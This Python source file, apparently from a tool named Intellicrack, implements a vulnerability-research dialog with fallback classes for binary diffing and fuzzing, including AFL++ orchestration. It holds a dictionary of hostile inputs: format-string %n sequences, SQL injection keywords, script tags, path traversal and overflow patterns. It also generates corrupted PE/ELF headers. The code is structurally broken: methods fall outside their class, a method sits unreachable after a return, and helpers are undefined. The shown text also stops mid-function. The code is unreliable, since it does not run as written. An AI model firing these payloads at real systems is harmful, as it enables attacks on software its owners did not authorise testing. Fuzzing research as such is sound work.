"""This file is part of Intellicrack.
Copyright (C) 2025 Zachary Flint.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see https://www.gnu.org/licenses/.

Vulnerability research dialog for security analysis workflows.
"""

import hashlib
import json
import os
import random
import re
import shutil
import struct
import subprocess
import tempfile
import time
from collections import defaultdict
from datetime import datetime
from typing import Any

from intellicrack.handlers.pyqt6_handler import (
    QCheckBox,
    QComboBox,
    QDialog,
    QFileDialog,
    QFont,
    QGridLayout,
    QGroupBox,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QListWidget,
    QMessageBox,
    QPrinter,
    QProgressBar,
    QPushButton,
    QSpinBox,
    QSplitter,
    Qt,
    QTableWidget,
    QTableWidgetItem,
    QTabWidget,
    QTextEdit,
    QThread,
    QTimer,
    QTreeWidget,
    QTreeWidgetItem,
    QVBoxLayout,
    QWidget,
    pyqtSignal,
)
from intellicrack.logger import logger

# Import research components
try:
    from ...core.vulnerability_research.binary_differ import BinaryDiffer
    from ...core.vulnerability_research.fuzzing_engine import FuzzingEngine, FuzzingStrategy
    from ...core.vulnerability_research.research_manager import (
        CampaignStatus,
        CampaignType,
        ResearchManager,
    )
    from ...core.vulnerability_research.vulnerability_analyzer import (
        AnalysisMethod,
        VulnerabilityAnalyzer,
    )

    RESEARCH_AVAILABLE = True
except ImportError as e:
    logger.error("Import error in vulnerability_research_dialog: %s", e)
    RESEARCH_AVAILABLE = False

    # Create mock classes when research components are not available
    class BinaryDiffer:
        """Binary comparison tool for vulnerability research."""

        def __init__(self):
            """Binary comparison engine for exploit development."""
            self.algorithms = ["ssdeep", "tlsh", "sdhash", "imphash"]
            self.similarity_threshold = 0.75
            self.diff_cache = {}

        def compare_binaries(self, binary1_path, binary2_path, algorithm="ssdeep", **kwargs):
            """Compare two binaries for exploitation research."""
            try:
                import os

                # Validate inputs
                if not os.path.exists(binary1_path) or not os.path.exists(binary2_path):
                    return {"error": "Binary files not found", "similarity": 0.0}

                # Generate cache key
                cache_key = f"{binary1_path}:{binary2_path}:{algorithm}"
                if cache_key in self.diff_cache:
                    return self.diff_cache[cache_key]

                # Read binary data
                with open(binary1_path, "rb") as f1, open(binary2_path, "rb") as f2:
                    data1, data2 = f1.read(), f2.read()

                # Perform comparison based on algorithm
                if algorithm == "ssdeep":
                    result = self._ssdeep_compare(data1, data2)
                elif algorithm == "tlsh":
                    result = self._tlsh_compare(data1, data2)
                elif algorithm == "sdhash":
                    result = self._sdhash_compare(data1, data2)
                elif algorithm == "imphash":
                    result = self._imphash_compare(data1, data2)
                else:
                    result = self._fallback_compare(data1, data2)

                # Add metadata
                result.update(
                    {
                        "file1_size": len(data1),
                        "file2_size": len(data2),
                        "size_ratio": len(data1) / len(data2) if len(data2) > 0 else 0,
                        "algorithm": algorithm,
                        "exploitable_differences": self._find_exploitable_diffs(data1, data2),
                    },
                )

                # Cache result
                self.diff_cache[cache_key] = result
                return result

            except Exception as e:
                return {"error": str(e), "similarity": 0.0}

        def _ssdeep_compare(self, data1, data2):
            """Fuzzy hash comparison for similar binaries."""

            # Simplified ssdeep-like algorithm
            def rolling_hash(data, window=64):
                hashes = []
                for i in range(0, len(data), window):
                    chunk = data[i : i + window]
                    h = hashlib.sha256(chunk).hexdigest()[:8]
                    hashes.append(h)
                return hashes

            h1, h2 = rolling_hash(data1), rolling_hash(data2)
            common = len(set(h1) & set(h2))
            total = len(set(h1) | set(h2))
            similarity = common / total if total > 0 else 0.0

            return {"similarity": similarity, "common_chunks": common, "total_chunks": total}

        def _tlsh_compare(self, data1, data2):
            """Trend Micro Locality Sensitive Hash comparison."""

            def tlsh_digest(data):
                # Simplified TLSH-like algorithm
                import struct

                buckets = [0] * 256
                for i in range(len(data) - 2):
                    triplet = struct.unpack("BBB", data[i : i + 3])
                    buckets[triplet[0] ^ triplet[1] ^ triplet[2]] += 1
                return hashlib.sha256(bytes(buckets)).hexdigest()[:32]

            h1, h2 = tlsh_digest(data1), tlsh_digest(data2)
            # Hamming distance for similarity
            distance = sum(c1 != c2 for c1, c2 in zip(h1, h2, strict=False))
            similarity = 1.0 - (distance / len(h1))

            return {"similarity": similarity, "hash1": h1, "hash2": h2, "distance": distance}

        def _sdhash_compare(self, data1, data2):
            """Statistically improbable features comparison."""

            def extract_features(data, chunk_size=64):
                features = set()
                for i in range(0, len(data), chunk_size):
                    chunk = data[i : i + chunk_size]
                    if len(chunk) == chunk_size:
                        # Extract statistical features
                        entropy = self._calculate_entropy(chunk)
                        if entropy > 6.5:  # High entropy chunks
                            features.add(hashlib.sha256(chunk).hexdigest()[:16])
                return features

            f1, f2 = extract_features(data1), extract_features(data2)
            if not f1 and not f2:
                return {"similarity": 1.0, "features1": 0, "features2": 0}

            intersection = len(f1 & f2)
            union = len(f1 | f2)
            similarity = intersection / union if union > 0 else 0.0

            return {
                "similarity": similarity,
                "features1": len(f1),
                "features2": len(f2),
                "common": intersection,
            }

        def _imphash_compare(self, data1, data2):
            """Import hash comparison for PE files."""

            def extract_imports(data):
                imports = []
                # Simple PE import extraction
                if data.startswith(b"MZ"):
                    # Find import table patterns
                    import_patterns = [b".dll", b".DLL", b".exe", b".EXE"]
                    for pattern in import_patterns:
                        start = 0
                        while True:
                            pos = data.find(pattern, start)
                            if pos == -1:
                                break
                            # Extract likely import name
                            name_start = max(0, pos - 32)
                            name_data = data[name_start : pos + len(pattern)]
                            imports.append(hashlib.sha256(name_data).hexdigest()[:8])
                            start = pos + 1
                return set(imports)

            i1, i2 = extract_imports(data1), extract_imports(data2)
            if not i1 and not i2:
                return {"similarity": 1.0, "imports1": 0, "imports2": 0}

            common = len(i1 & i2)
            total = len(i1 | i2)
            similarity = common / total if total > 0 else 0.0

            return {
                "similarity": similarity,
                "imports1": len(i1),
                "imports2": len(i2),
                "common_imports": common,
            }

        def _fallback_compare(self, data1, data2):
            """Fallback byte-level comparison."""
            if len(data1) != len(data2):
                size_similarity = min(len(data1), len(data2)) / max(len(data1), len(data2))
            else:
                size_similarity = 1.0

            # Sample comparison for large files
            sample_size = min(8192, len(data1), len(data2))
            sample1, sample2 = data1[:sample_size], data2[:sample_size]

            identical_bytes = sum(b1 == b2 for b1, b2 in zip(sample1, sample2, strict=False))
            byte_similarity = identical_bytes / sample_size if sample_size > 0 else 0.0

            overall_similarity = (size_similarity + byte_similarity) / 2

            return {
                "similarity": overall_similarity,
                "size_similarity": size_similarity,
                "byte_similarity": byte_similarity,
            }

        def _calculate_entropy(self, data):
            """Calculate Shannon entropy of data."""
            if not data:
                return 0.0

            import math
            from collections import Counter

            counts = Counter(data)
            length = len(data)
            entropy = 0.0

            for count in counts.values():
                p = count / length
                if p > 0:
                    entropy -= p * math.log2(p)

            return entropy

        def _find_exploitable_diffs(self, data1, data2):
            """Identify potentially exploitable differences."""
            diffs = []

            # Find function prologue/epilogue differences
            prologue_patterns = [b"\x55\x8b\xec", b"\x48\x83\xec", b"\x40\x53\x48"]
            epilogue_patterns = [b"\xc9\xc3", b"\x48\x83\xc4", b"\x5b\xc3"]

            for pattern in prologue_patterns + epilogue_patterns:
                pos1 = data1.find(pattern)
                pos2 = data2.find(pattern)
                if pos1 != pos2:
                    diffs.append(
                        {
                            "type": "function_boundary",
                            "pattern": pattern.hex(),
                            "position1": pos1,
                            "position2": pos2,
                            "exploitable": True,
                        },
                    )

            # Find jump table differences
            jump_patterns = [b"\xff\x25", b"\xff\x15", b"\xe9", b"\xeb"]
            for pattern in jump_patterns:
                count1 = data1.count(pattern)
                count2 = data2.count(pattern)
                if count1 != count2:
                    diffs.append(
                        {
                            "type": "control_flow",
                            "pattern": pattern.hex(),
                            "count1": count1,
                            "count2": count2,
                            "exploitable": True,
                        },
                    )

            return diffs

    class FuzzingEngine:
        """Advanced fuzzing engine for vulnerability discovery."""

        def __init__(self):
            """Advanced fuzzing engine for vulnerability discovery."""
            self.strategies = {
                "mutation": self._mutation_fuzzing,
                "generation": self._generation_fuzzing,
                "hybrid": self._hybrid_fuzzing,
                "afl++": self._afl_plus_plus_fuzzing,
            }
            self.running = False
            self.session_data = {}
            self.crash_count = 0
            self.coverage_data = {}
            self.fuzzing_dict = set()
            self._load_fuzzing_dictionaries()

        def _load_fuzzing_dictionaries(self):
            """Load fuzzing dictionaries from various sources."""
            # Default dictionary tokens
            self.fuzzing_dict = {
                # Format strings
                "%s",
                "%x",
                "%n",
                "%d",
                "%p",
                "%u",
                "%c",
                "%f",
                "%s%s%s",
                "%x%x%x",
                "%n%n%n",
                "%d%d%d",
                # Common delimiters
                ":",
                ";",
                ",",
                "|",
                "\t",
                "\n",
                "\r",
                "\r\n",
                " ",
                "  ",
                "   ",
                "\0",
                # Special characters
                "'",
                '"',
                "`",
                "\\",
                "/",
                "..",
                "../",
                "../../",
                # Common keywords
                "admin",
                "root",
                "user",
                "password",
                "login",
                "select",
                "union",
                "drop",
                "insert",
                "update",
                "<script>",
                "</script>",
                "<img>",
                "javascript:",
                # Numbers
                "0",
                "1",
                "-1",
                "255",
                "256",
                "65535",
                "65536",
                "2147483647",
                "-2147483648",
                "4294967295",
                # Buffer overflow patterns
                "A" * 10,
                "A" * 100,
                "A" * 1000,
                "\x41\x41\x41\x41",
                "\xff\xff\xff\xff",
                "\x00\x00\x00\x00",
                "\xde\xad\xbe\xef",
            }

            # Try to load AFL++ dictionaries
            dict_paths = [
                "/usr/share/afl++/dictionaries/",
                "/usr/local/share/afl++/dictionaries/",
                "C:\\afl++\\dictionaries\\",
                "./dictionaries/",
            ]

            for base_path in dict_paths:
                if os.path.exists(base_path):
                    try:
                        # Load .dict files
                        for dict_file in os.listdir(base_path):
                            if dict_file.endswith(".dict"):
                                dict_path = os.path.join(base_path, dict_file)
                                self._load_afl_dictionary(dict_path)
                    except Exception as e:
                        logger.debug(f"Failed to load dictionaries from {base_path}: {e}")

            # Load custom dictionary if specified
            custom_dict = os.path.join(os.path.dirname(__file__), "fuzzing.dict")
            if os.path.exists(custom_dict):
                self._load_afl_dictionary(custom_dict)

    def _load_afl_dictionary(self, dict_path):
        """Load AFL++ format dictionary file."""
        try:
            with open(dict_path, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue

                    # AFL dict format: name="value" or just "value"
                    if "=" in line:
                        parts = line.split("=", 1)
                        if len(parts) == 2:
                            value = parts[1].strip('"')
                            # Decode escape sequences
                            try:
                                value = value.encode().decode("unicode_escape")
                                self.fuzzing_dict.add(value)
                            except (UnicodeDecodeError, AttributeError) as e:
                                logger.debug(f"Failed to decode escape sequence: {e}")
                                self.fuzzing_dict.add(value)
                    elif line.startswith('"') and line.endswith('"'):
                        value = line[1:-1]
                        try:
                            value = value.encode().decode("unicode_escape")
                            self.fuzzing_dict.add(value)
                        except (UnicodeDecodeError, AttributeError) as e:
                            logger.debug(f"Failed to decode escape sequence: {e}")
                            self.fuzzing_dict.add(value)
        except Exception as e:
            logger.debug(f"Failed to load dictionary {dict_path}: {e}")

    def _is_afl_instrumented(self, binary_path):
        """Check if binary was compiled with AFL++ instrumentation."""
        try:
            with open(binary_path, "rb") as f:
                # Look for AFL++ instrumentation signatures
                data = f.read(1024 * 1024)  # Read first 1MB
                afl_signatures = [
                    b"__afl_area_ptr",
                    b"__afl_prev_loc",
                    b"__afl_fork_pid",
                    b"__sanitizer_cov_trace_pc_guard",
                ]
                return any(sig in data for sig in afl_signatures)
        except Exception:
            return False

    def _setup_afl_environment(self, output_dir):
        """Set up AFL++ environment variables."""
        import os

        env = os.environ.copy()
        env["AFL_SKIP_CPUFREQ"] = "1"
        env["AFL_NO_AFFINITY"] = "1"
        env["AFL_SHUFFLE_QUEUE"] = "1"
        env["AFL_FAST_CAL"] = "1"

        # Set output directory
        env["AFL_OUT_DIR"] = output_dir

        return env

    def _run_afl_fuzzer(self, target_path, input_dir, output_dir, duration):
        """Run AFL++ fuzzer on target binary."""
        import shutil
        import subprocess

        afl_fuzz = shutil.which("afl-fuzz")
        if not afl_fuzz:
            logger.warning("AFL++ not found, falling back to mutation fuzzing")
            return False

        # Check if binary is instrumented
        if not self._is_afl_instrumented(target_path):
            logger.warning("Binary not instrumented with AFL++, consider using afl-clang-fast")
            # Still try to run AFL++ in QEMU mode if available
            afl_qemu = shutil.which("afl-qemu-trace")
            if not afl_qemu:
                return False

        try:
            # Prepare AFL++ command
            cmd = [
                afl_fuzz,
                "-i",
                input_dir,  # Input directory
                "-o",
                output_dir,  # Output directory
                "-t",
                "1000",  # Timeout per run (ms)
                "-m",
                "none",  # Memory limit
                "-V",
                str(duration),  # Run duration in seconds
            ]

            # Add QEMU mode if binary not instrumented
            if not self._is_afl_instrumented(target_path):
                cmd.extend(["-Q"])  # QEMU mode

            cmd.extend(
                ["--", target_path, "@@"]
            )  # Separator, target binary, and input file placeholder

            # Set up environment
            env = self._setup_afl_environment(output_dir)

            # Run AFL++
            logger.info(f"Starting AFL++ fuzzer: {' '.join(cmd)}")
            process = subprocess.Popen(cmd, env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

            # Monitor AFL++ progress
            self._monitor_afl_progress(process, output_dir, duration)

            return True

        except Exception as e:
            logger.error(f"Failed to run AFL++ fuzzer: {e}")
            return False

    def _monitor_afl_progress(self, process, output_dir, duration):
        """Monitor AFL++ fuzzing progress."""
        import os
        import time

        start_time = time.time()
        stats_file = os.path.join(output_dir, "fuzzer_stats")

        while (time.time() - start_time) < duration:
            # Check if process is still running
            if process.poll() is not None:
                break

            # Read AFL++ stats
            if os.path.exists(stats_file):
                try:
                    with open(stats_file) as f:
                        stats = {}
                        for line in f:
                            if ":" in line:
                                key, value = line.strip().split(":", 1)
                                stats[key.strip()] = value.strip()

                        # Update fuzzing metrics
                        if "execs_done" in stats:
                            self.session_data["test_cases"] = int(stats["execs_done"])
                        if "unique_crashes" in stats:
                            self.crash_count = int(stats["unique_crashes"])

                        # Log progress
                        if self.session_data.get("test_cases", 0) % 1000 == 0:
                            paths_total = stats.get("paths_total", "0")
                            logger.info(
                                f"AFL++ progress: {self.session_data.get('test_cases', 0)} execs, "
                                f"{self.crash_count} crashes, {paths_total} paths",
                            )
                except Exception as e:
                    logger.debug("Error updating fuzz status: %s", e)

            time.sleep(1)

        # Terminate AFL++ if still running
        if process.poll() is None:
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()

    def _collect_afl_results(self, output_dir):
        """Collect results from AFL++ output directory."""
        import os

        # Collect crashes
        crashes_dir = os.path.join(output_dir, "crashes")
        if os.path.exists(crashes_dir):
            for crash_file in os.listdir(crashes_dir):
                if crash_file.startswith("id:"):
                    crash_path = os.path.join(crashes_dir, crash_file)
                    try:
                        with open(crash_path, "rb") as f:
                            crash_data = f.read()

                        # Calculate crash hash
                        crash_hash = hashlib.sha256(crash_data).hexdigest()[:16]

                        # Analyze crash exploitability
                        exploitability = self._analyze_crash_exploitability(crash_path, crash_data)

                        self.session_data["crashes"].append(
                            {
                                "file": crash_file,
                                "path": crash_path,
                                "hash": crash_hash,
                                "size": len(crash_data),
                                "exploitability": exploitability,
                            },
                        )
                        self.session_data["unique_crashes"].add(crash_hash)
                    except Exception as e:
                        logger.error(f"Failed to process crash {crash_file}: {e}")

        # Collect coverage information
        plot_data = os.path.join(output_dir, "plot_data")
        if os.path.exists(plot_data):
            try:
                with open(plot_data) as f:
                    lines = f.readlines()
                    if lines:
                        # Parse last line for final stats
                        last_line = lines[-1].strip().split(",")
                        if len(last_line) >= 3:
                            self.coverage_data["paths_total"] = int(last_line[2])
            except Exception as e:
                logger.error(f"Failed to parse AFL++ plot data: {e}")

    def _analyze_crash_exploitability(self, crash_path, crash_data):
        """Analyze crash for exploitability indicators."""
        # Simple heuristic-based analysis
        exploitability = "LOW"

        # Check for common exploitable patterns
        if len(crash_data) > 10000:  # Large inputs often indicate buffer overflows
            exploitability = "MEDIUM"

        # Check for specific byte patterns
        exploitable_patterns = [
            b"\x41\x41\x41\x41",  # AAAA - common in overflows
            b"\xde\xad\xbe\xef",  # Magic values
            b"\x00\x00\x00\x00",  # NULL bytes
            b"\xff\xff\xff\xff",  # All ones
        ]

        for pattern in exploitable_patterns:
            if pattern in crash_data:
                exploitability = "HIGH"
                break

        return exploitability


def _generate_fuzzing_report(self, output_dir):
    """Generate comprehensive fuzzing report for AFL++ results."""
    import os

    session = self.session_data

    # Calculate statistics
    total_duration = time.time() - session["start_time"]
    execs_per_sec = session["test_cases"] / total_duration if total_duration > 0 else 0

    report = {
        "success": True,
        "fuzzer": "AFL++",
        "output_directory": output_dir,
        "duration": total_duration,
        "test_cases_executed": session["test_cases"],
        "executions_per_second": execs_per_sec,
        "unique_crashes": len(session["unique_crashes"]),
        "total_crashes": len(session["crashes"]),
        "crashes": session["crashes"],
        "coverage_summary": {
            "paths_total": self.coverage_data.get("paths_total", 0),
            "unique_basic_blocks": len(self.coverage_data.get("basic_blocks", [])),
            "unique_functions": len(self.coverage_data.get("functions", [])),
            "unique_branches": len(self.coverage_data.get("branches", [])),
        },
        "exploitable_crashes": len(
            [c for c in session["crashes"] if c.get("exploitability") == "HIGH"]
        ),
        "recommendations": [],
    }

    # Add recommendations based on results
    if report["unique_crashes"] == 0:
        report["recommendations"].append("No crashes found. Consider:")
        report["recommendations"].append("- Increasing fuzzing duration")
        report["recommendations"].append("- Adding more diverse seed inputs")
        report["recommendations"].append("- Using different fuzzing strategies")
    else:
        report["recommendations"].append(f"Found {report['unique_crashes']} unique crashes")
        if report["exploitable_crashes"] > 0:
            report["recommendations"].append(
                f"{report['exploitable_crashes']} crashes appear exploitable"
            )
            report["recommendations"].append("Prioritize analysis of HIGH exploitability crashes")

    # Save report to file
    report_file = os.path.join(output_dir, "fuzzing_report.json")
    try:
        import json

        with open(report_file, "w") as f:
            json.dump(report, f, indent=2)
        logger.info(f"Fuzzing report saved to {report_file}")
    except Exception as e:
        logger.error(f"Failed to save fuzzing report: {e}")

    return report

    def start_fuzzing(self, target_path, strategy="mutation", duration=3600, **kwargs):
        """Start fuzzing campaign against target binary."""
        try:
            import os
            import tempfile
            import time

            if not os.path.exists(target_path):
                return {"success": False, "error": "Target not found"}

            self.running = True
            self.session_data = {
                "target": target_path,
                "strategy": strategy,
                "start_time": time.time(),
                "duration": duration,
                "test_cases": 0,
                "crashes": [],
                "unique_crashes": set(),
                "coverage_hits": {},
            }

            # Create output directory
            output_dir = kwargs.get("output_dir", tempfile.mkdtemp(prefix="fuzz_"))

            # Try AFL++ first if strategy is 'afl++' or use_afl is True
            if strategy == "afl++" or kwargs.get("use_afl", False):
                # Create input directory with seed files
                input_dir = os.path.join(output_dir, "input")
                os.makedirs(input_dir, exist_ok=True)

                # Generate initial test cases
                test_cases = self._generate_initial_testcases(target_path, **kwargs)

                # Save seed files for AFL++
                for i, case in enumerate(test_cases[:10]):  # Use first 10 as seeds
                    seed_file = os.path.join(input_dir, f"seed_{i:03d}")
                    with open(seed_file, "wb") as f:
                        if isinstance(case, str):
                            f.write(case.encode())
                        else:
                            f.write(case)

                # Run AFL++
                if self._run_afl_fuzzer(target_path, input_dir, output_dir, duration):
                    # Collect AFL++ results
                    self._collect_afl_results(output_dir)
                    return self._generate_fuzzing_report(output_dir)

            # Fallback to built-in fuzzing strategies
            # Initialize fuzzing strategy
            fuzzer_func = self.strategies.get(strategy, self._mutation_fuzzing)

            # Generate initial test cases
            test_cases = self._generate_initial_testcases(target_path, **kwargs)

            # Start fuzzing loop
            start_time = time.time()
            while self.running and (time.time() - start_time) < duration:
                for test_case in test_cases[:100]:  # Limit for simulation
                    if not self.running:
                        break

                    # Execute test case
                    result = self._execute_testcase(target_path, test_case)
                    self.session_data["test_cases"] += 1

                    # Check for crashes
                    if result.get("crashed"):
                        crash_hash = self._hash_crash(result)
                        if crash_hash not in self.session_data["unique_crashes"]:
                            self.session_data["unique_crashes"].add(crash_hash)
                            self.session_data["crashes"].append(
                                {
                                    "testcase": test_case[:100],  # Truncate for storage
                                    "crash_type": result.get("crash_type"),
                                    "pc": result.get("pc", 0),
                                    "hash": crash_hash,
                                    "exploitability": self._assess_exploitability(result),
                                },
                            )
                            self.crash_count += 1

                    # Update coverage
                    if "coverage" in result:
                        self._update_coverage(result["coverage"])

                    # Generate new test cases based on results
                    if result.get("interesting"):
                        new_cases = fuzzer_func(test_case, result)
                        test_cases.extend(new_cases[:10])  # Add promising mutations

                    # Periodic cleanup
                    if len(test_cases) > 1000:
                        test_cases = test_cases[-500:]  # Keep most recent

            self.running = False
            return self._generate_report()

        except Exception as e:
            self.running = False
            return {"success": False, "error": str(e)}


def _generate_initial_testcases(self, target_path, count=100, **kwargs):
    """Generate initial test cases for fuzzing."""
    import random

    test_cases = []

    # File format detection
    file_ext = target_path.split(".")[-1].lower()

    if file_ext in ["exe", "dll"]:
        # PE file fuzzing templates
        test_cases.extend(self._generate_pe_testcases(count // 4))
    elif file_ext in ["elf", "so"]:
        # ELF file fuzzing templates
        test_cases.extend(self._generate_elf_testcases(count // 4))

    # Generic binary patterns
    for _ in range(count // 2):
        size = random.randint(1, 8192)  # noqa: S311
        test_case = bytes([random.randint(0, 255) for _ in range(size)])  # noqa: S311
        test_cases.append(test_case)

    # Structured data patterns
    for _ in range(count // 4):
        # Format string vulnerabilities
        fmt_strings = [b"%s%s%s%s", b"%x%x%x%x", b"%n%n%n%n", b"AAAA%08x.%08x.%08x"]
        test_case = random.choice(fmt_strings) + b"A" * random.randint(100, 1000)  # noqa: S311
        test_cases.append(test_case)

    return test_cases


def _generate_pe_testcases(self, count):
    """Generate PE-specific test cases."""
    test_cases = []

    # PE header corruption
    pe_header = b"MZ\x90\x00" + b"A" * 60 + b"PE\x00\x00"
    for _ in range(count // 2):
        corrupted = bytearray(pe_header)
        # Corrupt random bytes
        for _ in range(5):
            pos = random.randint(0, len(corrupted) - 1)  # noqa: S311
            corrupted[pos] = random.randint(0, 255)  # noqa: S311
        test_cases.append(bytes(corrupted))

    # Import table corruption
    import_data = b"\x00" * 20 + b"kernel32.dll\x00" + b"ExitProcess\x00"
    for _ in range(count // 2):
        corrupted = bytearray(import_data)
        # Corrupt import names
        null_pos = corrupted.find(b"\x00")
        if null_pos > 0:
            corrupted[null_pos] = ord("A")
        test_cases.append(bytes(corrupted))

    return test_cases


def _generate_elf_testcases(self, count):
    """Generate ELF-specific test cases."""
    test_cases = []

    # ELF header corruption
    elf_header = b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 8
    for _ in range(count):
        corrupted = bytearray(elf_header + b"A" * 100)
        # Corrupt ELF fields
        corrupted[random.randint(4, 15)] = random.randint(0, 255)  # noqa: S311
        test_cases.append(bytes(corrupted))

    return test_cases


def _execute_testcase(self, target_path, test_case):
    """Execute test case and monitor for crashes."""
    try:
        import os
        import subprocess
        import tempfile

        # Write test case to temporary file
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(test_case)
            test_file = f.name

        try:
            # Simulate execution with timeout
            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                [target_path, test_file], check=False, timeout=5, capture_output=True, text=True
            )

            return {
                "crashed": result.returncode < 0,
                "crash_type": "segfault" if result.returncode == -11 else "unknown",
                "returncode": result.returncode,
                "stderr": result.stderr[:500],
                "interesting": len(result.stderr) > 0,
                "coverage": self._simulate_coverage(),
            }

        except subprocess.TimeoutExpired:
            return {"crashed": False, "timeout": True, "interesting": True}
        except Exception as e:
            return {"crashed": True, "crash_type": "exception", "error": str(e)}
        finally:
            os.unlink(test_file)

    except Exception as e:
        return {"crashed": False, "error": str(e)}

    def _get_real_coverage(self, target_binary, test_input_file):
        """Get real code coverage data using gcov or AFL++."""
        coverage_data = {
            "basic_blocks": 0,
            "functions": 0,
            "branches": 0,
            "detailed_coverage": None,
        }

        try:
            # Check if binary was compiled with AFL++ instrumentation
            import shutil

            afl_showmap = shutil.which("afl-showmap")

            if afl_showmap and self._is_afl_instrumented(target_binary):
                # Use AFL++ showmap to get coverage data
                try:
                    result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        [afl_showmap, "-o", "-", "-q", "--", target_binary, test_input_file],
                        check=False,
                        capture_output=True,
                        timeout=5,
                        text=True,
                    )

                    if result.returncode == 0:
                        # Parse coverage map output
                        coverage_lines = result.stdout.strip().split("\n")
                        coverage_data["basic_blocks"] = len(coverage_lines)
                        # Estimate functions/branches from basic blocks
                        coverage_data["functions"] = coverage_data["basic_blocks"] // 10
                        coverage_data["branches"] = coverage_data["basic_blocks"] // 2

                        return coverage_data
                except (subprocess.TimeoutExpired, subprocess.SubprocessError) as e:
                    logger.warning(f"AFL++ showmap failed: {e}")

            # Try comprehensive gcov analysis
            import tempfile

            with tempfile.TemporaryDirectory() as temp_dir:
                # Run target with gcov
                gcov_env = os.environ.copy()
                gcov_env["GCOV_PREFIX"] = temp_dir
                gcov_env["GCOV_PREFIX_STRIP"] = "0"

                # Execute with coverage
                try:
                    subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        [target_binary, test_input_file],
                        check=False,
                        env=gcov_env,
                        capture_output=True,
                        timeout=5,
                    )
                except (subprocess.TimeoutExpired, subprocess.SubprocessError) as e:
                    self.logger.debug("Error updating fuzz status: %s", e)  # Continue even if execution fails

                # Run gcov to generate coverage files
                try:
                    gcov_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        ["gcov", "-b", "-c", target_binary],  # noqa: S607
                        check=False,
                        cwd=temp_dir,
                        capture_output=True,
                        text=True,
                        timeout=10,
                    )

                    if gcov_result.returncode == 0:
                        # Use comprehensive gcov parsing
                        detailed_coverage = self._parse_gcov_data(temp_dir)
                        if detailed_coverage and detailed_coverage["summary"]:
                            summary = detailed_coverage["summary"]
                            coverage_data.update(
                                {
                                    "basic_blocks": summary["executed_lines"],
                                    "functions": summary["executed_functions"],
                                    "branches": summary["taken_branches"],
                                    "detailed_coverage": detailed_coverage,
                                },
                            )
                            return coverage_data

                        # Fallback to simple parsing
                        lines = gcov_result.stdout.split("\n")
                        for line in lines:
                            if "Lines executed:" in line:
                                match = re.search(r"(\d+) of (\d+)", line)
                                if match:
                                    coverage_data["basic_blocks"] = int(match.group(1))
                            elif "Branches executed:" in line:
                                match = re.search(r"(\d+) of (\d+)", line)
                                if match:
                                    coverage_data["branches"] = int(match.group(1))
                            elif "Functions executed:" in line:
                                match = re.search(r"(\d+) of (\d+)", line)
                                if match:
                                    coverage_data["functions"] = int(match.group(1))

                        return coverage_data
                except (subprocess.TimeoutExpired, subprocess.SubprocessError) as e:
                    logger.warning(f"Gcov analysis failed: {e}")

            # Fallback: analyze binary for potential coverage
            # Use objdump to count functions and basic blocks
            try:
                objdump_result = subprocess.run(  # nosec S603 - Using objdump for legitimate binary analysis  # noqa: S603
                    ["objdump", "-d", target_binary],  # noqa: S607
                    check=False,
                    capture_output=True,
                    text=True,
                    timeout=10,
                )

                if objdump_result.returncode == 0:
                    # Count functions
                    functions = len(
                        re.findall(r"^[0-9a-f]+ <\w+>:", objdump_result.stdout, re.MULTILINE)
                    )
                    # Count basic blocks (approximate by counting jump targets)
                    basic_blocks = len(
                        re.findall(r"^\s*[0-9a-f]+:", objdump_result.stdout, re.MULTILINE)
                    )
                    # Count branches (jmp, je, jne, etc.)
                    branches = len(re.findall(r"\s+j[a-z]+\s+", objdump_result.stdout))

                    coverage_data["functions"] = min(functions, 100)  # Cap for display
                    coverage_data["basic_blocks"] = min(
                        basic_blocks // 10, 100
                    )  # Estimate executed
                    coverage_data["branches"] = min(branches // 10, 50)  # Estimate taken

                    return coverage_data
            except (subprocess.TimeoutExpired, subprocess.SubprocessError) as e:
                logger.debug(f"Objdump analysis failed: {e}")

            # If all else fails, return minimal coverage
            return {"basic_blocks": 1, "functions": 1, "branches": 0, "detailed_coverage": None}

        except Exception as e:
            logger.warning(f"Coverage analysis failed: {e}")
            return {"basic_blocks": 1, "functions": 1, "branches": 0, "detailed_coverage": None}

    def _parse_gcov_data(self, gcov_dir, source_files=None):
        """Parse detailed gcov coverage data from .gcda and .gcno files."""
        coverage_info = {
            "files": {},
            "summary": {
                "total_lines": 0,
                "executed_lines": 0,
                "total_functions": 0,
                "executed_functions": 0,
                "total_branches": 0,
                "taken_branches": 0,
            },
            "functions": [],
            "hot_spots": [],
            "cold_spots": [],
        }

        try:
            import glob
            import os

            # Find all .gcov files
            gcov_files = glob.glob(os.path.join(gcov_dir, "*.gcov"))

            for gcov_file in gcov_files:
                file_info = self._parse_gcov_file(gcov_file)
                if file_info:
                    filename = os.path.basename(gcov_file).replace(".gcov", "")
                    coverage_info["files"][filename] = file_info

                    # Update summary
                    coverage_info["summary"]["total_lines"] += file_info["total_lines"]
                    coverage_info["summary"]["executed_lines"] += file_info["executed_lines"]
                    coverage_info["summary"]["total_functions"] += len(file_info["functions"])
                    coverage_info["summary"]["executed_functions"] += len(
                        [f for f in file_info["functions"] if f["executed"]],
                    )

                    # Collect function data
                    for func in file_info["functions"]:
                        func["file"] = filename
                        coverage_info["functions"].append(func)

            # Identify hot and cold spots
            coverage_info["hot_spots"] = self._identify_hot_spots(coverage_info["functions"])
            coverage_info["cold_spots"] = self._identify_cold_spots(coverage_info["functions"])

            return coverage_info

        except Exception as e:
